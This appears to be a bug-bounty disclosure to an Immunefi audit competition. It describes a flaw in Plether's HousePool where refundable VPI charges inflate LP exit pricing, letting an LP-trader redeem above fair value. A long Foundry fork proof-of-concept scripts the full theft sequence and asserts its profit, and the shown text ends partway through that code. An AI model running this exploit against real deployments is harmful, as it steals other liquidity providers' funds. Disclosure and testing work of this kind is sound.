# \#98076 [SC-Critical]  LP NAV counts refundable VPI charges as revenue, so a Junior LP who also trades can redeem above fair value and steal other Junior LPs' principal

**Submitted on Nov 4th 2026 at 21:01:57 UTC by @OxPrince for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98076
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether prices every Junior deposit and redemption from a NAV that has no VPI (virtual price impact) term. When a trader
opens a position that increases skew, it pays a VPI charge into the pool, and the NAV immediately counts that charge as
LP-owned revenue. Yet closing the position reverses the skew and pays the charge back to the trader as a rebate, capped
by the lifetime clamp at the amount charged. A Junior LP who also trades can therefore open a large skew-increasing
position just before its redemption settles, redeem at the inflated NAV, and close straight afterwards to take the charge
back from the LPs who stayed. On a local fork of the Arbitrum Sepolia v2.0.0 deployment, at a constant oracle price and
through public functions only, one cycle nets the attacker 21,090 USDG after all fees. It leaves the other Junior LPs
43,846 USDG below their pre-attack value, and the attacker can repeat it for as long as it keeps capital in Junior.

## Vulnerability Details


### 1. LP pricing has no VPI term

`buildReconcileSnapshot` builds "the single canonical terminal-NAV snapshot shared by LP entry and exit pricing"
(`packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78`):

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}

if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

The inputs are pool cash, trader claims and the capped price-PnL delta. Nothing accounts for VPI that the pool has
collected but will hand back.

`HousePool._settleLpEpoch` reconciles once from this snapshot. It then funds every redemption in that settlement at the
resulting principal (`packages/perps/src/HousePool.sol:835-840`):

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
```

### 2. A VPI charge becomes LP revenue as soon as it is paid

The open's trade cost is `vpiAssets + executionFeeAssets` (`OpenAccountingLib.sol:135`). The execution fee goes to the
treasury. The rest, the VPI charge, is recorded as pool revenue with the cash already arrived
(`packages/perps/src/CfdEngineSettlementSidecar.sol:454-463`):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

The next reconcile adds the charge to tranche principal. The NAV that prices exits therefore rises by the full charge.

### 3. The same charge goes back to the trader on the reverse trade

VPI is the change in a skew potential, `C(S) = k·S²/(2D)` (`CfdMath.sol`; WHITEPAPER.md §5.1). Reversing a move at the
same depth therefore returns the charge in full. The whitepaper's own example (WHITEPAPER.md:903-904):

> "The VPI charge is $20,000. Reversing the move at unchanged depth produces a $20,000 rebate before the lifetime clamp."

The attacker's own redemption lowers depth. That makes the natural rebate on the close larger than the charge, and the
lifetime clamp cuts it back to exactly the accrued charge (`packages/perps/src/libraries/CloseAccountingLib.sol:116-118`):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The rebate is paid out of the pool (`packages/perps/src/CfdEngineSettlementSidecar.sol:621-624`):

```solidity
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

So while the position is open, the pool holds cash it will give back on the close, as long as no other trade reduces skew
first. LP pricing treats that cash as owned.

### 4. The attacker controls both legs within one LP epoch

The attacker uses three unprivileged addresses: an LP, a trader account and a keeper. Every step is a public call:

1. **LP:** call `TrancheVault.requestRedeem(shares, lp, lp)` on the Junior vault, targeting epoch E.
2. **Trader, about 40 seconds before E:** call `OrderRouter.commitOrder` to open a position on the heavier side that
   pushes skew up to the 40% cap. The attacker's keeper calls `OrderRouter.executeOrder` one block later, and the pool
   receives charge C.
3. **At E, any keeper:** call the permissionless `OrderRouter.settleLpEpoch(priceUpdate)`. With open positions, the
   only extra requirement is a current-epoch mark installed through the Router (`HousePool.sol:809-819`). The
   redemption is funded at a Junior principal that includes C.
4. **Trader:** commit and execute the close. The clamp-bounded rebate returns C to the trader, minus the close fee netted
   into it. It comes out of a pool that now belongs only to the remaining LPs.
5. **LP and trader:** the LP calls `claimRedeem` and the trader calls `MarginClearinghouse.withdraw`.

Let f be the attacker's share of Junior. Over one cycle:
- The LP leg gains f·C over a fair exit.
- The trading leg nets zero VPI and pays two execution fees plus adverse-confidence slippage.
- The remaining Junior LPs fund the refund. They lose f·C, less the close fee and slippage that stay in the pool.

### Why this is a vulnerability, not intended behaviour

Plether documents that VPI sits outside the price book:
- "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book" (SECURITY.md:863);
- "anticipated carry, VPI, fees, spreads, and other action economics stay outside terminal `K`"
  (ACCOUNTING_SPEC.md:1064-1066).

That accounting choice is documented. Its consequence is not documented anywhere: an exiting LP can withdraw a charge the
pool still owes back to a trader. The protocol's own rules point the other way:

- **The same docs protect the opposite case.** For negative VPI, the trader's clawback reserve is kept out of NAV "so LPs
  cannot withdraw it as marked equity before the matching position obligation settles" (WHITEPAPER.md:887-888). Likewise,
  "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV" (SECURITY.md:872). For a positive
  charge, the matching obligation is the reversal rebate, and there is no equivalent protection. In the fork, the
  outstanding charge raised the NAV that priced the exit by 143,165 USDG within one block, at an unchanged price.
- **The project treats VPI-based LP extraction as an attack.**
  - The clamp's comment (CloseAccountingLib.sol:112-114): "Prevents LP sandwich attacks where an attacker opens at high
    depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate."
  - SECURITY.md:1443: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips".
  - Commit 1be0a078 added the one-hour LP cooldown because it "prevents same-block deposit+withdraw for VPI
    manipulation".

  The clamp protects the trading leg. This attack takes the value through LP share pricing instead.
- **The only accepted timing transfer is carry.** The docs accept that LP ownership follows collection time for carry:
  "This is a collection-time ownership policy, not a claim that timing cannot transfer part of old carry revenue to a new
  LP" (ACCOUNTING_SPEC.md:736-740; WHITEPAPER.md:966-977). Carry is never refunded to the trader who paid it. A VPI charge
  is, by construction.
- **Symmetric LP pricing is a stated goal.** SECURITY.md:858-859: "new LPs receive the same marked-liability discount
  borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV". Here the leaving LP is paid
  for revenue still owed back to a trader, and the LPs who stay inherit that obligation.
- **The tests do not cover it.** `test/perps/accounting/fees/VpiDepth.t.sol` uses LP deposits and withdrawals as the
  depth lever. It asserts "Minority VPI depth attack must not be profitable" (:104) and "The round trip must not extract
  LP cash" (:258). But it measures only the trader leg and pool cash, never the value of LP shares. Every LP-NAV suite
  under `test/perps/accounting/waterfall/` runs with `vpiFactor = 0`.
- **It is not a listed known issue.**
  - The VPI section of Known Limitations (SECURITY.md:1434-1444) does not mention LP pricing.
  - Neither Cecuro nor SC Audit Studio has a VPI-vs-NAV item.
  - The AI-scan item "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" is about close-time
    depth enlarging a rebate. Here the clamp returns exactly the charge whatever the depth at close. With
    `vpiFactor = 0`, the identical round trip extracts nothing (isolation control below).



## Impact Details
**Critical. Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**
What is taken is the other Junior LPs' principal: they end below their own pre-attack value at an unchanged price.


## References
In-scope code, at commit `a82d4fef`:
- [HousePoolAccountingLib.sol L60-L78: `buildReconcileSnapshot`, the LP NAV with no VPI term](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78)
- [HousePool.sol L797-L893: `settleLpEpoch` / `_settleLpEpoch`, one reconcile prices every redemption](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L893)
- [CfdEngineSettlementSidecar.sol L454-L463: open VPI charge recorded as pool revenue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463)
- [CfdEngineSettlementSidecar.sol L621-L624: close rebate paid from the pool](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624)


## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: AGPL-3.0
// =====================================================================================================================
// End-to-end fork proof against the Arbitrum Sepolia v2.0.0 deployment, a fork target the program accepts for PoCs.
// No Arbitrum One deployment exists yet, so this forks the v2.0.0 stack.
//
// What runs unmodified: every in-scope contract at its deployed address, with its deployed bytecode (runtime code hashes
// asserted against deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json), its deployed release
// configuration, and its state at the fork block. That state holds ≈101.03M USDG of existing Junior LP principal,
// ≈1.11M Senior, and a long-heavy open-interest book at ≈19% of depth before the attacker's deposit.
// What is replaced (out-of-scope components only, as the program allows):
//   * Pyth (0x0B73…f42B): etched with the repo MockPyth and fed the real component prices Pyth held at the fork block
//     (read on-chain before the etch). The basket stays at its fork-block level; only publish times advance.
//   * the ArbSys precompile (address 100): Foundry's emulation pins arbBlockNumber() to the fork block, so the test
//     advances it with vm.mockCall in step with its own block sequence (commit and execution in successive blocks).
// Every actor step is a public call by an unprivileged EOA against the deployed contracts. The settlement token is the
// deployed testnet MockUSDG, minted through its own public `mint`.
//
// Run: requires an Arbitrum Sepolia ARCHIVE RPC. Public endpoints have pruned the state at the fork block, so the
// default URL in setUp() fails with "historical state ... is not available".
//   cd packages/perps
//   ARB_SEPOLIA_RPC_URL=<archive RPC> forge test --match-path test/perps/zz_r3/R3E/VpiNavForkProof.t.sol -vv
// Or against a local Anvil fork of the same block:
//   anvil --fork-url <archive RPC> --fork-block-number 325961411
//   ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/perps/zz_r3/R3E/VpiNavForkProof.t.sol -vv
// =====================================================================================================================
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IMintableUSDG {

    function mint(
        address to,
        uint256 amount
    ) external;

}

contract VpiNavForkProofTest is Test {

    // ---- Arbitrum Sepolia v2.0.0 (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env) ----
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant JUNIOR = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant SETTLEMENT_SIDECAR = 0xd3EDe337E042d5aa6BA68E03D0c885b3d4A062DC;
    address internal constant TERMINAL_NAV_BOOK = 0x61C7f7Cf91c295a86250E1e05a91901e8E1e51A3;
    address internal constant EXECUTION_SIDECAR = 0x0AE016ef599BCDF0bbBEDba441401c3B6C6184eA;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    address internal constant TREASURY = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
    address internal constant ARB_SYS = address(100);

    uint256 internal constant FORK_BLOCK = 325_961_411; // 2026-11-04 11:46:47 UTC, deployed v2.0.0 state
    uint256 internal constant FEED_COUNT = 6;

    // ---- Attacker (three unprivileged EOAs controlled by one party) ----
    address internal constant ATTACKER_LP = address(0xBAD1);
    address internal constant ATTACKER_TRADER = address(0xBAD2);
    address internal constant ATTACKER_KEEPER = address(0xBAD3);
    uint256 internal constant ATTACKER_LP_ASSETS = 90_000_000e6; // total attacker capital stays below 100M USDG
    uint256 internal constant ATTACKER_TRADER_FUNDING = 600_000e6;
    uint256 internal constant ATTACKER_MARGIN = 400_000e6;

    OrderRouter internal router = OrderRouter(ROUTER);
    CfdEngine internal engine = CfdEngine(ENGINE);
    HousePool internal pool = HousePool(POOL);
    TrancheVault internal junior = TrancheVault(JUNIOR);
    MarginClearinghouse internal clearinghouse = MarginClearinghouse(CLEARINGHOUSE);
    PletherOracle internal oracle = PletherOracle(ORACLE);

    struct Component {
        int64 price;
        uint64 conf;
        int32 expo;
    }

    bytes32[] internal feedIds;
    Component[] internal components;
    uint256 internal clientNonce;
    uint256 internal attackerShares;
    uint256 internal redeemRequestId;
    uint256 internal l2Block;

    struct RunResult {
        uint256 attackerInitial; // USDG + attacker Junior shares valued at the protocol's own pending Junior price
        uint256 attackerFinal; // USDG after every claim and clearinghouse withdrawal
        uint256 traderLegInitial; // trader + keeper clearinghouse balance before the trading leg
        uint256 traderLegFinal; // trader + keeper clearinghouse balance after the trading leg
        uint256 treasuryFinal;
        uint256 juniorFinal; // incumbent Junior value (attacker fully exited): pending Junior principal
        uint256 seniorFinal;
        uint256 redeemAssets; // USDG funded for the attacker's Junior shares
        uint256 juniorNavBeforeOpen;
        uint256 juniorNavAfterOpen;
        int256 vpiChargeAtSettle; // attacker position's lifetime VPI while the epoch settles
        uint256 poolBeforeClose;
        uint256 poolAfterClose;
        uint256 size;
    }

    function setUp() public {
        vm.createSelectFork(vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://sepolia-rollup.arbitrum.io/rpc")), FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia");

        // 0. The contracts under test are the DEPLOYED v2.0.0 bytecode (manifest.json runtimeCodeHash values).
        assertEq(ROUTER.codehash, 0x6C65de67eF2824572537e3641a71100100C49d909b196c43e5d271312534d3cf, "router code");
        assertEq(ENGINE.codehash, 0xA0f8e5BE6E622A5A83E46e88f6B012757ef924cF613a50cba52a2b5c66b76a6b, "engine code");
        assertEq(POOL.codehash, 0x5E684Cc82bfC5B697A24c80eF26910CFbe25EfBE6fb2ca184c421808b5ced957, "pool code");
        assertEq(JUNIOR.codehash, 0x8d00D3d0273B7a321cBF61232Ea79ef0b503Fe0d83bb52609321765a0a04f3bf, "junior code");
        assertEq(
            CLEARINGHOUSE.codehash, 0xc8e4965893dBD7073303303E9d5Ab9c775aABCc1259635e4993fc7fdb0681398, "CH code"
        );
        assertEq(ORACLE.codehash, 0x1Ecb1CA760E7BA51d958697EeEFE06fF7BA1a3Ad162b3e7978af3df30393bc13, "oracle code");
        assertEq(
            SETTLEMENT_SIDECAR.codehash,
            0x540083c758046571C5770F9950282EEf938986ff41d78538109ddf549534b059,
            "settlement sidecar code"
        );
        assertEq(
            TERMINAL_NAV_BOOK.codehash, 0x181223a2aC1C4fc3811d6baC5bc882310FF933D5450ffce6de5cf0c44aeb55b9, "book code"
        );
        assertEq(
            EXECUTION_SIDECAR.codehash,
            0xFC72fcbe4496d0D5356E96d259536CD4eDcB926dd7fe1473a4275ddfb09cb57e,
            "execution sidecar code"
        );

        // 0b. Deployed release configuration (manifest economics) — no parameter is changed by this test.
        (uint256 vpiFactor, uint256 maxSkewRatio, uint256 mm, uint256 im,,,,,,) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "release vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "release maxSkew");
        assertEq(mm, 10, "release MM");
        assertEq(im, 20, "release IM");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");

        // 1. Snapshot the real component prices Pyth holds at the fork block, then replace Pyth (out of scope).
        for (uint256 i; i < FEED_COUNT; ++i) {
            bytes32 id = oracle.pythFeedIds(i);
            PythStructs.Price memory p = IPyth(PYTH).getPriceUnsafe(id);
            feedIds.push(id);
            components.push(Component({price: p.price, conf: p.conf, expo: p.expo}));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot = 3; slot <= 10; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots: fee, counters, flags, feed list
        }
        l2Block = FORK_BLOCK;
        _mockL2Block();

        // 2. Live mark refresh by an unprivileged keeper with the replayed real components.
        _refreshMark();
        assertTrue(engine.lastMarkTime() == vm.getBlockTimestamp(), "mark installed");

        // 3. Attacker becomes a Junior LP through the public async vault path (MockUSDG public mint).
        IMintableUSDG(USDG).mint(ATTACKER_LP, ATTACKER_LP_ASSETS);
        vm.startPrank(ATTACKER_LP);
        IERC20(USDG).approve(JUNIOR, ATTACKER_LP_ASSETS);
        uint256 depositRequestId = junior.requestDeposit(ATTACKER_LP_ASSETS, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        _warpTo(junior.depositEpochStart(depositRequestId) + 2);
        _settle();
        uint256 claimable = junior.claimableDepositRequest(depositRequestId, ATTACKER_LP);
        assertEq(claimable, ATTACKER_LP_ASSETS, "attacker deposit activated");
        vm.prank(ATTACKER_LP);
        attackerShares = junior.claimDeposit(depositRequestId, claimable, ATTACKER_LP, ATTACKER_LP);
        assertGt(attackerShares, 0, "attacker holds Junior shares");

        // 4. After the 1h cooldown, early in an hour: request the full Junior redemption (common to both runs).
        _warpTo(junior.depositEpochStart(depositRequestId) + 1 hours + 10 minutes);
        vm.prank(ATTACKER_LP);
        redeemRequestId = junior.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);

        // 5. Fund the trader account (public deposit) — present in both runs.
        IMintableUSDG(USDG).mint(ATTACKER_TRADER, ATTACKER_TRADER_FUNDING);
        vm.startPrank(ATTACKER_TRADER);
        IERC20(USDG).approve(CLEARINGHOUSE, ATTACKER_TRADER_FUNDING);
        clearinghouse.deposit(ATTACKER_TRADER, ATTACKER_TRADER_FUNDING);
        vm.stopPrank();
    }

    // ------------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------------

    /// @notice Positive control on the forked deployment: the same full Junior exit with no trade is fair.
    function test_fork_control_fairJuniorExit() public {
        RunResult memory c = _run(false);
        _log("CONTROL (no trade)", c);
        assertApproxEqAbs(c.attackerFinal, c.attackerInitial, 5e6, "fair exit returns the attacker's own value");
    }

    /// @notice Attack on the forked deployment. Asserts the impact, the exit-NAV inflation (G1), the overpaid exit (G2),
    ///         the clamp holding on the trading leg while the LP leg extracts more (G3), and conservation.
    function test_fork_attack_vpiNavPump_breaksDocumentedNavGuarantees() public {
        uint256 snap = vm.snapshotState();
        RunResult memory c = _run(false);
        vm.revertToState(snap);
        RunResult memory a = _run(true);
        _log("CONTROL (no trade)", c);
        _log("ATTACK", a);

        int256 attackerVsControl = int256(a.attackerFinal) - int256(c.attackerFinal);
        int256 attackerNet = int256(a.attackerFinal) - int256(a.attackerInitial);
        int256 juniorVsControl = int256(a.juniorFinal) - int256(c.juniorFinal);
        int256 seniorVsControl = int256(a.seniorFinal) - int256(c.seniorFinal);
        int256 treasuryVsControl = int256(a.treasuryFinal) - int256(c.treasuryFinal);
        int256 tradeLeg = int256(a.traderLegFinal) - int256(a.traderLegInitial);
        console2.log("=== RESULT (USDG atoms, 6 dp) ===");
        console2.log("attacker gain vs control           ", attackerVsControl);
        console2.log("attacker net vs own start          ", attackerNet);
        console2.log("incumbent Junior LPs vs control    ", juniorVsControl);
        console2.log("Senior vs control                  ", seniorVsControl);
        console2.log("treasury vs control                ", treasuryVsControl);
        console2.log("trading leg alone (trader+keeper)  ", tradeLeg);
        console2.log("exit assets: attack / control      ", a.redeemAssets, c.redeemAssets);

        // Impact: the attacker profits after every fee; the incumbent (non-attacker) Junior LPs lose principal.
        assertGt(attackerVsControl, 0, "attacker beats its fair exit");
        assertGt(attackerNet, 0, "attacker net profit after all fees");
        assertLt(juniorVsControl, 0, "incumbent Junior LPs lose vs control");

        // G1: the exit NAV includes the refundable charge. The docs keep anticipated VPI and its reserve out of NAV
        // (SECURITY.md:872) and stop LPs withdrawing the negative-VPI reserve "before the matching position obligation
        // settles" (WHITEPAPER.md:887-888). A positive charge gets no equivalent protection: at an unchanged oracle
        // price, the outstanding charge enters the NAV that prices the exit.
        assertGt(a.vpiChargeAtSettle, 0, "positive VPI charge outstanding while the epoch settles");
        assertGe(
            a.juniorNavAfterOpen,
            a.juniorNavBeforeOpen + uint256(a.vpiChargeAtSettle) - uint256(a.vpiChargeAtSettle) / 100,
            "G1: exit NAV includes >= 99% of the outstanding VPI charge"
        );

        // G2: the exit is priced above the fair (control) exit. This mirrors the symmetry principle in
        // SECURITY.md:858-859 ("new LPs ... do not inherit old trader obligations at a higher deposit NAV"). Here the
        // leaving LP is paid for a charge still owed back to the trader, and the clamp-bound rebate is left to the
        // incumbents.
        assertGt(a.redeemAssets, c.redeemAssets, "G2: exit priced above the fair (control) exit");

        // G3: the clamp holds on the trading leg, but the LP leg extracts more. The clamp is meant to stop VPI-based
        // LP extraction (CloseAccountingLib.sol:112-114 "Prevents LP sandwich attacks ..."; SECURITY.md:1443 "the
        // lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips"). The trading leg loses
        // money by itself, yet the LP leg extracts more than that loss.
        assertLt(tradeLeg, 0, "trading leg alone is unprofitable (designed clamp holds)");
        assertGt(attackerVsControl, 0, "G3: LP leg extracts more than the trading leg costs");
        // The clamp returns exactly the gross charge on close; the close execution fee is netted into that rebate,
        // so the pool's cash outflow is charge - closeFee. The trading leg therefore loses only its two fees.
        // Real Pyth confidences make both executions pay the side-adverse confidence shift (25% of basket confidence);
        // that slippage stays in the pool. Bound it at 0.5 bp of notional so the VPI round trip is shown to net to zero.
        uint256 notional = (a.size * engine.lastMarkPrice()) / 1e20;
        uint256 closeFee = notional * engine.executionFeeBps() / 10_000;
        uint256 adverseSlippageBound = notional / 20_000;
        int256 vpiResidual = -tradeLeg - (treasuryVsControl + int256(closeFee));
        console2.log("close fee (netted into rebate)     ", closeFee);
        console2.log("trading-leg residual after 2 fees  ", vpiResidual);
        assertGe(vpiResidual, 0, "residual is adverse-confidence slippage paid to the pool, never a trader gain");
        assertLe(uint256(vpiResidual), adverseSlippageBound, "VPI round trip nets to zero (clamp holds)");
        assertApproxEqAbs(
            a.poolBeforeClose - a.poolAfterClose,
            uint256(a.vpiChargeAtSettle) - closeFee - uint256(vpiResidual),
            1e6,
            "close rebate = full VPI charge minus netted close fee minus adverse slippage"
        );

        // Conservation: value moved between parties; nothing was created (within carry/rounding dust).
        int256 residual = attackerVsControl + juniorVsControl + seniorVsControl + treasuryVsControl;
        console2.log("conservation residual              ", residual);
        assertApproxEqAbs(residual, int256(0), 25e6, "transfer from incumbents to attacker and treasury");
    }

    // ------------------------------------------------------------------------------------------------------------------
    // Flow
    // ------------------------------------------------------------------------------------------------------------------

    function _run(
        bool attack
    ) internal returns (RunResult memory r) {
        uint256 epochStart = junior.depositEpochStart(redeemRequestId);
        _warpTo(epochStart - 40);
        _refreshMark();
        r.attackerInitial = _attackerUsdg() + _attackerJuniorValue();
        r.traderLegInitial = clearinghouse.balanceAssets(ATTACKER_TRADER) + clearinghouse.balanceAssets(ATTACKER_KEEPER);

        if (attack) {
            r.size = _skewIncreasingLongSize();
            (, r.juniorNavBeforeOpen) = pool.getPendingDepositTrancheState();
            _commitAndExecute(CfdTypes.Side.LONG, r.size, ATTACKER_MARGIN, false);
            (, r.juniorNavAfterOpen) = pool.getPendingDepositTrancheState();
        }

        // Epoch boundary: any keeper settles atomically with a fresh mark at the SAME basket price.
        _warpTo(epochStart + 2);
        _settle();
        (,,,,,, r.vpiChargeAtSettle) = engine.positions(ATTACKER_TRADER);
        r.redeemAssets = junior.claimableRedeemAssets(redeemRequestId, ATTACKER_LP);

        if (attack) {
            r.poolBeforeClose = pool.totalAssets();
            _commitAndExecute(CfdTypes.Side.LONG, r.size, 0, true);
            r.poolAfterClose = pool.totalAssets();
        }

        uint256 claimableShares = junior.claimableRedeemRequest(redeemRequestId, ATTACKER_LP);
        assertEq(claimableShares, attackerShares, "redemption fully funded");
        vm.prank(ATTACKER_LP);
        junior.claimRedeem(redeemRequestId, claimableShares, ATTACKER_LP, ATTACKER_LP);

        r.traderLegFinal = clearinghouse.balanceAssets(ATTACKER_TRADER) + clearinghouse.balanceAssets(ATTACKER_KEEPER);
        _withdrawAll(ATTACKER_TRADER);
        _withdrawAll(ATTACKER_KEEPER);
        assertEq(junior.balanceOf(ATTACKER_LP), 0, "attacker fully exited Junior");

        // Value everyone on the protocol's own post-reconcile view at a fresh mark (same step in both runs).
        _refreshMark();
        (r.seniorFinal, r.juniorFinal) = pool.getPendingDepositTrancheState();
        r.treasuryFinal = clearinghouse.balanceAssets(TREASURY);
        r.attackerFinal = _attackerUsdg();
    }

    /// @dev LONG size that lifts live skew to 39.9% of economic depth (cap is 40%), in whole 100-token lots.
    function _skewIncreasingLongSize() internal view returns (uint256 size) {
        uint256 price = engine.lastMarkPrice();
        (, uint256 longOi,,) = engine.sides(0);
        (, uint256 shortOi,,) = engine.sides(1);
        uint256 longAssets = (longOi * price) / 1e20;
        uint256 shortAssets = (shortOi * price) / 1e20;
        require(longAssets > shortAssets, "live book expected long-heavy");
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 targetSkew = (depth * 3990) / 10_000;
        uint256 addAssets = targetSkew - (longAssets - shortAssets);
        size = ((addAssets * 1e20) / price) / 1e20 * 1e20;
    }

    function _commitAndExecute(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, isClose);
        vm.prank(ATTACKER_TRADER);
        uint64 orderId = router.commitOrder(request);
        uint256 commitTime = vm.getBlockTimestamp();
        _warpTo(vm.getBlockTimestamp() + 1);
        vm.prank(ATTACKER_KEEPER);
        router.executeOrder(orderId, _payload(commitTime + 1, commitTime));
        (uint256 positionSize,,,,,,) = engine.positions(ATTACKER_TRADER);
        assertEq(positionSize, isClose ? 0 : size, isClose ? "attacker long closed" : "attacker long opened");
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("r3-fork-proof", ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _refreshMark() internal {
        _warpTo(vm.getBlockTimestamp() + 1);
        vm.prank(ATTACKER_KEEPER);
        router.updateMarkPrice(_payload(vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1));
    }

    function _settle() internal {
        vm.prank(ATTACKER_KEEPER);
        router.settleLpEpoch(_payload(vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1));
    }

    /// @dev Explicit MockPyth payload: every feed at its real fork-block price/conf/expo with the given publish times.
    function _payload(
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](FEED_COUNT);
        for (uint256 i; i < FEED_COUNT; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: components[i].price,
                    conf: components[i].conf,
                    expo: components[i].expo,
                    publishTime: publishTime,
